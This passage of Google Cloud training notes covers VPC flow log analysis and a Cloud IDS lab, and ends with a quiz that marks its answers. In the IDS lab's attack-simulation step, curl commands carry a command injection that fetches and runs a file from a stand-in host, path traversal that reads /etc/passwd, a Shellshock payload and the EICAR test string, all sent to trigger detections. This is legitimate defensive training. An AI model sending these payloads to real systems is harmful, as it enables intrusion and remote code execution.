--region europe-west4 --enable-flow-logs \
--logging-metadata=include-all
```

Copied!

Notice that you enabled VPC flow logging for the subnets in `us-central1` and `europe-west4`. None of the other subnets have flow logging enabled.

1. To create three instances in different subnets (to be used for later testing), run the following commands:

```
gcloud compute instances create default-us-vm \
--machine-type e2-micro \
--zone=us-central1-c --network=default
```

Copied!

```
gcloud compute instances create default-eu-vm \
--machine-type e2-micro \
--zone=europe-west4-a --network=default
```

Copied!

```
gcloud compute instances create default-ap-vm \
--machine-type e2-micro \
--zone=asia-south1-b --network=default
```

Copied!

**Note:** If you get a `ZONE_RESOURCE_POOL_EXHAUSTED` error, update the zone in the gcloud command and try running it again. For example, if `us-central1-a` is failing, try `us-central1-b`instead.

Click *Check my progress* to verify the objective.

Enable VPC flow logging on subnets and create instances



Check my progress



#### Task 2. Generate network traffic for testing

In this task, you create network traffic to test the connectivity between the instances.

1. In the Google Cloud Console, on the **Navigation menu**, click **Compute Engine > VM instances** to display a list of VM instances.
2. Record both the internal and external IP addresses of each instance. You will need these IPs later in this lab.

| **Instance**  | **Internal IP** | **External IP** |
| :------------ | :-------------- | :-------------- |
| default-ap-vm | `*****`         | `*****`         |
| default-eu-vm | `*****`         | `*****`         |
| default-us-vm | `*****`         | `*****`         |

1. In the row for the `default-us-vm` instance, click **SSH**.
2. When connected via SSH, issue the following commands:

```
sudo apt-get install -y host
host www.wikipedia.org 8.8.8.8
ping -c 5 default-eu-vm.europe-west4-a
ping -c 5 www.google.com
curl http://www.google.com
```

Copied!

These commands did the following:

- Installed the host DNS resolution utility.
- Performed a DNS lookup of www.wikipedia.org using the 8.8.8.8 DNS server.
- Pinged the **default-eu-vm** instance and [www.google.com](https://www.google.com/)
- Used curl to create an HTTP connection to [www.google.com](https://www.google.com/)

Next, you run the same commands as above, but instead of pinging the default-eu-vm from the default-us-vm, you ping the default-us-vm from the default-eu-vm.

1. Return to the Cloud Console, and in the row for the `default-eu-vm` instance, click **SSH**.
2. When connected via SSH, issue the following commands:

```
sudo apt-get install -y host
host www.wikipedia.org 8.8.8.8
ping -c 5 default-us-vm.us-central1-c
ping -c 5 cloud.google.com
curl http://www.google.com
```

Copied!

1. Return to the Cloud Console, and in the row for the `default-ap-vm` instance, click **SSH**.
2. When connected via SSH, issue the following commands:

```
sudo apt-get install -y host
host www.bitnami.com 8.8.8.8
curl http://www.bitnami.com
```

Copied!

#### Task 3. View flow logs in Cloud Logging

In this task, you view the VPC flow logs for all the projects in Cloud Logging.

##### **Access all flow logs**

1. In the Cloud Console, go to the **Navigation menu** > **Logging** > **Logs Explorer**. (If you do not see this menu option, then continue this lab, at step 3).
2. In the **Query** panel, under **All Resource**, click **Subnetwork** and then **Apply**.
3. Under **All Log names**, click **compute.googleapis.com/vpc_flows** and then **Apply**.

**Note:** If no log names appear for the above, try pasting in `compute.googleapis.com%2Fvpc_flows` instead.

1. Click **Run query**.
2. In the Query results panel, entries from the VPC flow logs appear. If you do not see **compute.googleapis.com/vpc_flows**, wait a few minutes for this log type to show up.

**Note:** This should show all the VPC flow logs for your project. Remember, you only have the flow logs enabled for two of the subnets.

1. Expand one of the log entries.
2. Within that log entry, expand `jsonPayload`, and then expand `connection`.

**Note:** Some entries do not have `jsonPayload` fields. You may need to open other entries until you find one that does.

1. Investigate the information about the connection; specifically notice that the port and IP address of both the source and destination have been logged.
2. Find a log that has `src_instance` in `jsonPayload`. Investigate the information about this src instance.

The `src_instance` may be one of your instances or an outside IP address if the traffic came from outside your VPC network.

![Source location log with VM Instance field](https://cdn.qwiklabs.com/xTE%2FP%2FhkKqxqQUu2KVDKpGWRatK2lpcfp%2Bhs3lzQ%2FaA%3D)

1. Investigate any other information in this log entry or another.

#### Task 4. Perform advanced filtering

In this task, you perform advanced filtering using Query builder. You also explore access logs for specific source or destination IP, and for specific ports and protocols.

An advanced logs filter is a Boolean expression that specifies a subset of all the log entries in your project. A few things it can be used for include:

- Choosing log entries for specific VMs.
- Choosing log entries for specific source or destination ports.
- Choosing log entries for specific source or destination IP address.
- Choosing log entries specific protocols.

1. Click inside the **Query** box.
2. Remove the current query and paste in the following, replacing `<INSERT_PROJECT_ID>` with your Qwiklabs Google Cloud Project ID:

```
resource.type="gce_subnetwork"
log_name="projects/<INSERT_PROJECT_ID>/logs/compute.googleapis.com%2Fvpc_flows"
```

Copied!

1. Click **Run query**.

**Note:** For the remainder of this lab, be sure to always leave these two lines at the start of the filter. You will be adding additional lines after these two. If you accidentally delete or modify these two lines, copy them from above (be sure to change the project ID).

##### **Access logs for a specific source or destination IP address**

1. Add the following line to the end of the filter. Replace `Internal_IP_Of_default_us_vm` with the internal IP address of your `default_us_vm` instance (you recorded this earlier):

```
jsonPayload.connection.src_ip="Internal_IP_Of_default_us_vm"
```

Copied!

1. Click **Run query**.

You now see all the log entries where the source IP address is the internal IP address of the `default-us-vm` instance. These should be the same entries as for the earlier filter that showed the source instance of `default-us-vm`.

##### **Access logs for specific ports and protocols**

1. Delete the last line in the filter (the one matching `src_ip`) and replace it with the following line that will only show entries with a destination port of 22 (SSH):

```
jsonPayload.connection.dest_port=22
```

Copied!

1. Click **Run query** and observe the results. You should see three logs because you SSH-ed into the VMs three times.
2. Modify the last line of the filter to only show traffic with a destination port of 80 (HTTP):

```
jsonPayload.connection.dest_port=80
```

Copied!

1. Click **Run query** and observe the results.
2. Match multiple ports by replacing the last line and adding this statment with an `OR` to the end of the port filter:

```
jsonPayload.connection.dest_port=(80 OR 22)
```

Copied!

1. Change the last line in the filter to only show entries using the UDP protocol (protocol #17):

```
jsonPayload.connection.protocol=17
```

Copied!

1. Click **Run query** and observe the results.

You may see a few entries in the log. These would correspond to the DNS calls you made with the host utility.

1. Investigate one of the log entries and locate the destination port number that DNS uses.

**Note:** DNS uses port 53.

1. Modify the filter to show all entries with a protocol of 17 and destination port of 53:

```
jsonPayload.connection.protocol=17
jsonPayload.connection.dest_port=53
```

Copied!

1. Click **Run query** and observe the results.

**Note:** Currently, flow logs only monitor UDP (protocol #17) and TCP (protocol #6). Earlier, you generated some ICMP traffic on the instances using `ping`. ICMP is protocol #1. If you create a filter to show protocol #1, you will not see any entries. Try this if you want.

#### Task 5. Perform network monitoring and support real-time security analysis

In this task, you create a filter and use it to see whether any RDP traffic is attempting to access the VPC.

##### **Search for unexpected ports and protocols**

Because you are running Linux instances within the VPC network, you should not see any RDP traffic. However, there is a firewall rule within the default settings that allows RDP traffic from anywhere, and this means that someone or something on the internet could attempt to connect to your servers using the RDP protocol.

1. Modify the flow log filter to show all traffic with a destination port of 3389 (RDP). Be sure to leave the first two lines of the existing filter, but delete and replace the other lines with the following and click **Run query**:

```
jsonPayload.connection.dest_port=3389
```

Copied!

1. If you see any RDP traffic, investigate where the traffic is coming from. You may not see any RDP traffic, but it is common to see at least some. If you did not see any traffic, wait a few minutes and check again.

If you did see some RDP traffic, which often happens, that demonstrates how pervasive unwanted traffic can be on the internet. It also shows why ensuring that VPC networks and firewall rules are set up correctly is important.

By using the default VPC in this lab, with all of the default firewall rules, you saw the results of not fine-tuning these rules to help exclude unwanted traffic.

**Note:** It is a recommended best practice for production systems to use a custom VPC with very specific firewall rules and delete the default VPC.

**Note:** Another service that can help with issues like restricting unwanted traffic is [Google Cloud Armor](https://cloud.google.com/armor/). Google Cloud Armor delivers defense at scale against infrastructure and application Distributed Denial of Service (DDoS) attacks using Google's global infrastructure and security systems.

##### Create exports to support real-time security analysis

Flow logs can be exported to any destination that Cloud Logging export supports (Pub/Sub, BigQuery, etc.). Creating an export will export future matching logs to the selected destination, existing logs will not be exported.

Exporting logs to BigQuery allows for the BigQuery analysis tools to be used on your logs to perform analysis. Exporting logs to Pub/Sub allows your logs to be streamed to other applications, other repositories, or third parties.

When you create a Cloud export, the current filter will be applied to the export. This means that only events that match the filter will be exported. For example, if you have a filter that only displays traffic to the destination port 3389, only traffic that matches that filter will be exported.

This can help reduce the amount of data that is exported (which could lower costs) or allow for different exports depending on what the data contains. For this lab you will clear the filter and export all logs because you do not have much traffic.

1. Clear all the text in the query editor and click **Run query**.
2. Click **Actions** > **Create Sink**.
3. For "Sink name", type **FlowLogBQExport** and click **Next**.
4. For "Select sink service", select **BigQuery dataset**.
5. For "Select Bigquery dataset", select **Create new BigQuery dataset**.
6. For "Dataset ID", type `flowlogs_dataset`, and then click **Create dataset**.
7. Click **Create sink**. The Logs Router Sinks page appears.

You should be able to see the sink you created **(FlowLogBQExport)**. If you are unable to see the sink click on **Logs Router**.

1. On the right side, click the **More actions** menu (![more_menu.png](https://cdn.qwiklabs.com/EAVAvFhminZXqeUIlGzj2ylRyw7YT4PycCIK1UZk3M4%3D)) for your export and select **View sink details**.
2. Click **Cancel**.

**Note:** All future logs will now be exported to BigQuery. The BigQuery tools can now be used to perform analysis on the flow log data. You will perform a simple query in BigQuery later in the lab.

**Note:** You could also export log entries to Pub/Sub or Cloud Storage. Exporting to Pub/Sub can be useful if you want to flow through an ETL process before storing in a database **(Operations > Pub/Sub > Dataflow > BigQuery/Cloud Bigtable)**. Exporting to Cloud Storage will batch up entries and write them into Cloud Storage objects approximately every hour.

Now create an export to Pub/Sub.

1. On the Logs Router page, click **Create sink**.
2. For "Sink name", type **FlowLogPubSubExport**, and click **Next**.
3. Select "Select sink service" as **Cloud Pub/Sub topic**.
4. For "Select a Cloud Pub/Sub topic", select **Create a Topic**.
5. For Topic ID, type **FlowLogsTopic**, and then click **Create**.
6. Click **Create sink**.

The Logs Router Sinks page appears. You should be able to see the sink you created (FlowLogsTopic). If you are unable to see the sink click on **Logs Router**.

1. On the right side, click the **More actions** menu for your export and select **View sink details**.

This will show the filter that was present when the export was created.

1. Click **Cancel**.

You can now subscribe to the new Pub/Sub topic and receive notifications when new logs are available. This allows for the logs to be streamed to and integrated with a SIEM (Security Information and Event Management) tool.

SIEM tools are used to gain real-time operational insights and create audit reports using powerful visualization capabilities.

#### Task 6. Analyzing flow logs in BigQuery

In this task, you analyze flow logs in BigQuery.

**Note:** When you export logs to a BigQuery dataset, Cloud Logging creates dated tables to hold the exported log entries. Log entries are placed in tables whose names are based on the entries' log names.

1. In the Cloud Console, on the **Navigation menu**, click **BigQuery**.
2. In the navigation pane under **Explorer**, expand the project name to see the **flowlogs_dataset** dataset.
3. Expand the dataset to see the table with your exported flow logs.
4. Click on the table name that starts with `compute_googleapis_com_vpc_flows_` and review the schemas and details of the tables that are being used.

**Note:** If you don't see that table appear in the dataset, open the navigation menu and click "Cloud Overview" or any other service. Then, open the navigation menu and select BigQuery and try to find the table again (it sometimes takes a minute or two for the table to appear in the dataset).

1. Click **Query**.
2. Delete the text provided in the **New query** window and paste in the query below:

```
#standardSQL
SELECT
   jsonPayload.connection.dest_ip,
   resource
FROM
   `flowlogs_dataset.compute_googleapis_com_vpc_flows*` WHERE
   jsonPayload.connection.dest_port = 22
LIMIT 1000
```

Copied!

1. Click **Run**.

This query returns information about traffic connecting to port 22.

After a couple of seconds, the results are displayed. You should see one or two entries, which is the activity you generated in this lab. Remember, BigQuery is only showing activity since the export was created.

**Note:** If you did not see any results, you may need to generate some traffic to the instances. To do so, go to the **Navigation menu > Compute Engine** and click **SSH** for each instance. Then try the query again.

Click *Check my progress* to verify the objective.

Create exports and analyze flow logs in BigQuery



Check my progress



#### Task 7. Disable flow logging

In this task, you disable VPC flow logging. VPC flow logging can be turned off with the `--no-enable-flow-logs` option.

1. Try disabling it on one of your subnets by running the following command in the Cloud Shell terminal:

```
gcloud compute networks subnets update default \
--region europe-west4 --no-enable-flow-logs
```

Copied!

1. You can verify that it has been disabled by viewing the VPC in the Cloud Console. On the **Navigation menu**, click **VPC network > VPC networks**. If prompted click on **LEAVE**.

#### Task 8. Review

In this lab, you enabled VPC flow logging for a subnet. You accessed logs via Cloud Logging. You also filtered logs for specific subnets, VMs, ports, and protocols. Next, you performed network monitoring, forensics, and real-time security analysis. Finally, you disabled VPC flow logging.

### LAB - Getting Started with Cloud IDS

#### Overview

In this lab, you deploy [Cloud Intrusion Detection System (Cloud IDS)](https://cloud.google.com/intrusion-detection-system), a next-generation advanced intrusion detection service that provides threat detection for intrusions, malware, spyware, and command-and-control attacks. You simulate multiple attacks and view the threat details in the Google Cloud console.

![Cloud IDS Infrastructure Diagram](images/ENIYqVr9SB12IcIIqVmupO%2BfT7DCqkiZdHgtHJtYDuA%3D.png)

#### Objectives

In this lab, you learn how to perform the following tasks:

- Build out a Google Cloud networking environment as shown in the previous diagram.
- Create a Cloud IDS endpoint.
- Create two virtual machines using gcloud CLI commands.
- Create a Cloud IDS packet mirroring policy.
- Simulate attack traffic from a virtual machine.
- View threat details in the Cloud console and Cloud Logging.

#### Setup

##### Before you click the Start Lab button

**Note: Read these instructions.**



Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources will be made available to you.

This Qwiklabs hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google Cloud for the duration of the lab.

##### What you need

To complete this lab, you need:

- Access to a standard internet browser (Chrome browser recommended).
- Time to complete the lab.

**Note:** If you already have your own personal Google Cloud account or project, do not use it for this lab.

**Note:** If you are using a Pixelbook, open an Incognito window to run this lab.

##### How to start your lab and sign in to the Console

1. Click the **Start Lab** button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is a panel populated with the temporary credentials that you must use for this lab.

   ![Credentials panel](images/%2FtHp4GI5VSDyTtdqi3qDFtevuY014F88%2BFow%2FadnRgE%3D.png)

2. Copy the username, and then click **Open Google Console**. The lab spins up resources, and then opens another tab that shows the **Choose an account** page.

   **Note:** Open the tabs in separate windows, side-by-side.

3. On the Choose an account page, click **Use Another Account**. The Sign in page opens.

   ![Choose an account dialog box with Use Another Account option highlighted ](images/eQ6xPnPn13GjiJP3RWlHWwiMjhooHxTNvzfg1AL2WPw%3D.png)

4. Paste the username that you copied from the Connection Details panel. Then copy and paste the password.

**Note:** You must use the credentials from the Connection Details panel. Do not use your Google Cloud Skills Boost credentials. If you have your own Google Cloud account, do not use it for this lab (avoids incurring charges).

1. Click through the subsequent pages:

- Accept the terms and conditions.
- Do not add recovery options or two-factor authentication (because this is a temporary account).
- Do not sign up for free trials.

After a few moments, the Cloud console opens in this tab.

**Note:** You can view the menu with a list of Google Cloud Products and Services by clicking the **Navigation menu** at the top-left. ![Cloud Console Menu](images/9vT7xPlxoNP%2FPsK0J8j0ZPFB4HnnpaIJVCDByaBrSHg%3D.png)

##### Activate Google Cloud Shell

Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.

Google Cloud Shell provides command-line access to your Google Cloud resources.

1. In Cloud console, on the top right toolbar, click the Open Cloud Shell button.

   ![Highlighted Cloud Shell icon](images/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D.png)

2. Click **Continue**.

It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your *PROJECT_ID*. For example:

![Project ID highlighted in the Cloud Shell Terminal](images/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D.png)

**gcloud** is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.

- You can list the active account name with this command:

```
gcloud auth list
```

Copied!

**Output:**

```
Credentialed accounts:
 - <myaccount>@<mydomain>.com (active)
</mydomain></myaccount>
```

**Example output:**

```
Credentialed accounts:
 - google1623327_student@qwiklabs.net
```

- You can list the project ID with this command:

```
gcloud config list project
```

Copied!

**Output:**

```
[core]
project = <project_id>
</project_id>
```

**Example output:**

```
[core]
project = qwiklabs-gcp-44776a13dea667a6
```

**Note:** Full documentation of **gcloud** is available in the [gcloud CLI overview guide ](https://cloud.google.com/sdk/gcloud).

This lab will all be done using `gcloud` CLI commands inside Cloud Shell.

#### Task 1. Enable APIs

In this task you set the project ID variable and then enable the APIs required for the lab.

1. In Cloud Shell, to set the **Project_ID** environment variable, run the following command:

```
export PROJECT_ID=$(gcloud config get-value project | sed '2d')
```

Copied!

1. Enable the Service Networking API:

```
gcloud services enable servicenetworking.googleapis.com \
    --project=$PROJECT_ID
```

Copied!

If prompted to authorize the command, click **Authorize**.

1. Enable the Cloud IDS API:

```
gcloud services enable ids.googleapis.com \
    --project=$PROJECT_ID
```

Copied!

1. Enable the Cloud Logging API:

```
gcloud services enable logging.googleapis.com \
    --project=$PROJECT_ID
```

Copied!

Click *Check my progress* to verify the objective.

Enable APIs.



Check my progress



#### Task 2. Build the Google Cloud networking footprint

In this task, you create a Google Cloud VPC network and configure private services access.

Private services access is a private connection between your VPC network and a network owned by Google or a third party. Google or the third party, entities who are offering services, are also known as service producers.

The private connection enables virtual machine (VM) instances in your VPC network and the services that you access to communicate exclusively by using internal IP addresses.

1. In Cloud Shell, to create a VPC, run the following command:

```
gcloud compute networks create cloud-ids \
--subnet-mode=custom
```

Copied!

If prompted to authorize the command, click **Authorize**.

1. Add a subnet to the VPC for mirrored traffic in us-east1:

```
gcloud compute networks subnets create cloud-ids-useast1 \
--range=192.168.10.0/24 \
--network=cloud-ids \
--region=us-east1
```

Copied!

1. Configure private services access:

```
gcloud compute addresses create cloud-ids-ips \
--global \
--purpose=VPC_PEERING \
--addresses=10.10.10.0 \
--prefix-length=24 \
--description="Cloud IDS Range" \
--network=cloud-ids
```

Copied!

1. Create a private connection:

```
gcloud services vpc-peerings connect \
--service=servicenetworking.googleapis.com \
--ranges=cloud-ids-ips \
--network=cloud-ids \
--project=$PROJECT_ID
```

Copied!

Click *Check my progress* to verify the objective.

Create a VPC.



Check my progress



#### Task 3. Create a Cloud IDS endpoint

In this task you create a Cloud IDS endpoint in us-east1 with a severity set to *informational*.

Cloud IDS uses a resource known as an IDS endpoint, a zonal resource that can inspect traffic from any zone in its region. Each IDS endpoint receives mirrored traffic and performs threat detection analysis.

**Note:** The creation of the IDS endpoint takes approximately 20 minutes.

1. To create a Cloud IDS endpoint, in Cloud Shell, run the following command:

```
gcloud ids endpoints create cloud-ids-east1 \
--network=cloud-ids \
--zone=us-east1-b \
--severity=INFORMATIONAL \
--async
```

Copied!

1. Verify that the Cloud IDS endpoint is initiated:

```
gcloud ids endpoints list --project=$PROJECT_ID
```

Copied!

If the message **Would you like to enable and retry** appears, press **Y**.

The output should be similar to this:

Command Output

```
  ID: cloud-ids-east1
  LOCATION: us-east1-b
  SEVERITY: INFORMATIONAL
  STATE: CREATING
  NETWORK: cloud-ids
  TRAFFIC_LOGS:
```

Click *Check my progress* to verify the objective.

Create a Cloud IDS endpoint.



Check my progress



#### Task 4. Create Firewall rules and Cloud NAT

In this task you create two firewall rules: allow-http-icmp and allow-iap-proxy.

To enable standard http port (TCP 80) connections, and ICMP protocol connections to the server VM from all sources in the cloud-ids network, you define the *allow-http-icmp* rule.

To enable SSH connections to the VMs from the Identity-Aware Proxy IP range, you define the allow-iap-proxy_ rule.

You also configure Cloud Router and then configure Cloud NAT. As a prerequisite for Cloud NAT, a Cloud Router must first be configured in the same region. To provide internet access to VMs that don't have a public IP address, a Cloud NAT must be created in the same region. The VMs will be created without a public IP address to make sure that they are inaccessible *from* the internet. However, they will need access *to* the internet to download updates and files.

1. To create the allow-http-icmp rule, in Cloud Shell, run the following command:

```
gcloud compute firewall-rules create allow-http-icmp \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:80,icmp \
--source-ranges=0.0.0.0/0 \
--target-tags=server
```

Copied!

1. Create the allow-iap-proxy rule:

```
gcloud compute firewall-rules create allow-iap-proxy \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:22 \
--source-ranges=35.235.240.0/20
```

Copied!

Click *Check my progress* to verify the objective.

Add firewall rules to the VPC.



Check my progress



1. To create a Cloud Router, run the following command:

```
gcloud compute routers create cr-cloud-ids-useast1 \
--region=us-east1 \
--network=cloud-ids
```

Copied!

1. To configure a Cloud NAT, run the following command:

```
gcloud compute routers nats create nat-cloud-ids-useast1 \
--router=cr-cloud-ids-useast1 \
--router-region=us-east1 \
--auto-allocate-nat-external-ips \
--nat-all-subnet-ip-ranges
```

Copied!

Click *Check my progress* to verify the objective.

Create a Cloud Router.



Check my progress



#### Task 5. Create two virtual machines

In this task, you create two virtual machines (VMs). The first virtual machine is your web server, which is mirroring to Cloud IDS. The second virtual machine is the source of your attack traffic.

You establish an SSH connection to your server via Identity-Aware Proxy (IAP), check the status of your web service server, create a benign malware file on the web server, and then add content to the file.

1. To create a virtual machine to be a server mirroring to Cloud IDS, in Cloud Shell, run the following command:

```
gcloud compute instances create server \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.20 \
--metadata=startup-script=\#\!\ /bin/bash$'\n'sudo\ apt-get\ update$'\n'sudo\ apt-get\ -qq\ -y\ install\ nginx \
--tags=server \
--image=debian-11-bullseye-v20240709 \
--image-project=debian-cloud \
--boot-disk-size=10GB
```

Copied!

This command creates a Debian server in us-east1 and installs a simple web service.

1. Create a virtual machine to be a client sending attack traffic:

```
gcloud compute instances create attacker \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.10 \
--image=debian-11-bullseye-v20240709 \
--image-project=debian-cloud \
--boot-disk-size=10GB
```

Copied!

This command prepares a Debian server in us-east1 to use as your client.

Click *Check my progress* to verify the objective.

Create a virtual machine.



Check my progress



##### Prepare your server

In this procedure, you validate your server and then create a benign malware payload for your client.

1. To establish an SSH connection to your server via IAP, run the following command:

```
gcloud compute ssh server --zone=us-east1-b --tunnel-through-iap
```

Copied!

This command will prompt you through a series of steps to create an ssh key and the required directories.

1. To agree to the directory creation prompt, type **Y**.
2. When prompted for a passphrase, to use a blank passphrase, press ENTER twice.

You are now in the shell of your server VM.

##### Confirm that the web service is running

In this procedure, you check the status of your web service server. You create a benign malware file on the web server and then add content to the file.

1. To check the status of your web service, run the following Linux command:

```
sudo systemctl status nginx
```

Copied!

The output should be similar to this:

Command Output

```
 ● nginx.service - A high performance web server and a reverse proxy server
   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)
   Active: active (running) since Tue 2021-05-25 18:01:49 UTC; 5h 24 min ago
   Docs: man:nginx(8)
   Main PID: 1347 (nginx)
   Tasks: 3 (limit: 4665)
   Memory: 4.5M
   CGroup: /system.slice/nginx.service
           ├─1347 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
           ├─1348 nginx: worker process
           └─1349 nginx: worker process

   May 25 18:01:49 server systemd[1]: Starting A high performance web server and a reverse proxy server...
   May 25 18:01:49 server systemd[1]: Started A high performance web server and a reverse proxy server.                       
```

1. Change directory to the web service:

```
cd /var/www/html/
```

Copied!

1. Create a benign malware file on the web server. Run the following Linux command to create a text file:

```
sudo touch eicar.file
```

Copied!

1. Add the following content to the newly created file:

```
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file
```

Copied!

1. Exit the server VM shell and return to Cloud Shell:

```
exit
```

Copied!

#### Task 6. Create a Cloud IDS packet mirroring policy

In this task, you create a Cloud IDS packet mirroring policy. This policy determines what traffic is mirrored to the Cloud IDS. You will then attach this policy to the newly created Cloud IDS endpoint.

As mentioned earlier, the Cloud IDS endpoint creation takes some time. Before you can proceed with this lab, the endpoint must be in an active/ready state.

1.To verify that your Cloud IDS endpoint is active, in Cloud Shell, run the following command to show the current state of the Cloud IDS endpoint:

```
gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
```

Copied!

The output should be similar to this:

Command Output

```
  STATE: READY
```

Continue to run this command every few minutes until the state shows *READY*.

1. Identify the Cloud IDS endpoint forwarding rule and confirm that the Cloud IDS endpoint state is *READY*:

```
export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 --zone=us-east1-b --format="value(endpointForwardingRule)")
echo $FORWARDING_RULE
```

Copied!

The output should be similar to this:

Command Output

```
  https://www.googleapis.com/compute/v1/projects/md975a7fa0a53145dp-tp/regions/us-east1/forwardingRules/ids-fr-cloud--xkkerutlagop6opm                         
```



1. Create and attach the packet mirroring policy:

```
gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \
--region=us-east1 \
--collector-ilb=$FORWARDING_RULE \
--network=cloud-ids \
--mirrored-subnets=cloud-ids-useast1
```

Copied!

Click *Check my progress* to verify the objective.

Create and attach the packet mirroring policy.



Check my progress



1. Verify that the packet mirroring policy is created:

```
gcloud compute packet-mirrorings list
```

Copied!

This gcloud command lists the packet mirroring policies and shows whether they are enabled/disabled.

The output should be similar to this:

Command Output

```
  NAME: cloud-ids-packet-mirroring
  REGION: us-east1
  NETWORK: cloud-ids
  ENABLE: TRUE                        
```

#### Task 7. Simulate attack traffic

In this task, you establish an SSH connection to your attacked virtual machine and simulate attack traffic from a virtual machine to your server. You do this by running a selection of `curl` commands that range from low severity to critical severity.

1. To establish an SSH connection to your attacker virtual machine through IAP, in Cloud Shell, run the following command:

```
gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap
```

Copied!

**Note:** You are now in the shell of your attacker VM and not the Cloud Shell machine.

1. Run the following `curl` requests in sequence to simulate low, medium, high, and critical severity alerts on the IDS:

**Low Severity:**

```
curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
```

Copied!

**Medium Severity:**

```
curl http://192.168.10.20/?item=../../../../WINNT/win.ini
curl http://192.168.10.20/eicar.file
```

Copied!

**High Severity:**

```
curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd
```

Copied!

**Critical Severity:**

```
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
```

Copied!

1. Exit the attacker virtual machine shell and return to Cloud Shell:

```
exit
```

Copied!

#### Task 8. Review threats detected by Cloud IDS

In this task, you review the various attack traffic captured by the Cloud IDS in the Cloud console. The captured attack traffic profiles provide details of each threat.

1. In the Google Cloud console, in the **Navigation menu** (![Navigation menu](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **Network Security > Cloud IDS**.
2. Click the **Threats** tab.

The Cloud IDS captured various attack traffic profiles and provided the details on each threat. You may need to click **Refresh** if you do not see any threats. You now dive a little deeper and view threat details.

1. Locate the **Bash Remote Code Execution Vulnerability** threat, click **More** (![More Button](https://cdn.qwiklabs.com/2ufrDePg5inKfodUoT2Kib4oE7II7emYn%2BypCC85FjQ%3D)), and then select **View threat details**.

**Note:** You may have noticed that there are multiple threats that produce the same name, for example, “Bash Remote Code Execution Vulnerability”. This is expected behavior.



If you look closely, you will see that the session IDs of the threats are different. Since both VMs created are in the same subnet, we are seeing mirrored packets for both the client and server. Outbound packets from the client are being mirrored to IDS, and additionally, inbound packets to the server are being mirrored to IDS.

1. Now you view the details of this incident in Cloud Logging. To return to the **Threats** page, click the left arrow.
2. Click the **Threats** tab.
3. Locate the **Bash Remote Code Execution Vulnerability**, click **More**, and then select **View threat logs**.

A new Cloud Logging tab opens that displays the same details. This enables you to send the logs to Cloud Storage, Chronicle, or any SIEM/SOAR. You can also create custom workflows to take remediation action based on alerts, like creating a Cloud Function that triggers on an alert and creating or updating a firewall rule to block the IP address, or creating or updating a Google Cloud Armor policy.

Click *Check my progress* to verify the objective.

Getting Started with Cloud IDS.



Check my progress



#### Congratulations!

In this lab, you did the following:

1. Created a new VPC and deployed a Cloud IDS endpoint.
2. Deployed two VMs, created a packet mirroring policy, and then sent attack traffic.
3. Verified that the Cloud IDS captured the threats by viewing the threat details in the Cloud console and the threat logs in Cloud Logging.

### Quiz



1. Which ONE of the following statements is TRUE when discussing the SSL capabilities of Google Cloud Load Balancer?

- **The Google-managed profile, COMPATIBLE, allows clients which support out-of-date SSL features.**
- You must use one of the 3 pre-configured “Google-managed profiles” to specify the level of compatibility appropriate for your application.
- Google Cloud Load Balancers require, and will only accept, a Google-managed SSL Cert.
- If no SSL policy is set, the SSL policy is automatically set to the most constrained policy, which is RESTRICTED.

Correct! The other two profiles, MODERN and RESTRICTED allow you to restrict SSL usage to clients with modern capabilities, or to restrict SSL access even further to meet compliance requirements.

2. Which FOUR of the following are firewall rule parameters?

- Timestamp

- **Direction**

- **Source**

- **Action**

- **IP Address**

- Organization

- Project

  

3. Which statement about VPC Service Controls is false?

- VPC Service Controls protect resources within a perimeter so they can only be privately accessed from clients within authorized VPC networks.
- VPC Service Controls restrict Internet access to resources within a perimeter using allowlisted IPv4 and IPv6 ranges.
- VPC Service Controls prevent data from being copied to unauthorized resources outside the perimeter using service operations.
- **VPC Service Controls restrict Internet access to resources within a perimeter by checking permissions assigned to Cloud Identity and Active Directory accounts only.**

Correct! Perimeters are checked against allowlisted IPv4 or IPv6 ranges, not against accounts.

4. Which TWO of the following statements about VPCs is TRUE?

- Google Cloud Firewall allows rules by default only affect traffic flowing in one direction.

- A connection is considered active if it has at least one packet sent over a one hour period.

- **VPC firewall rules in Google Cloud are global in scope.**

  Correct! Since VPC networks can be global in Google Cloud, firewall rules are also global.

- **Every VPC network functions as a distributed firewall where firewall rules are defined at the network level.**

  Correct! Google Cloud firewall rules exist not only between your instances and other networks, but also between individual instances within the same network.



# 10 Security Best Practices in Google Cloud











# Securing your Network with Cloud Armor

## LAB - Bot Management with Google Cloud Armor and reCAPTCHA

### Overview

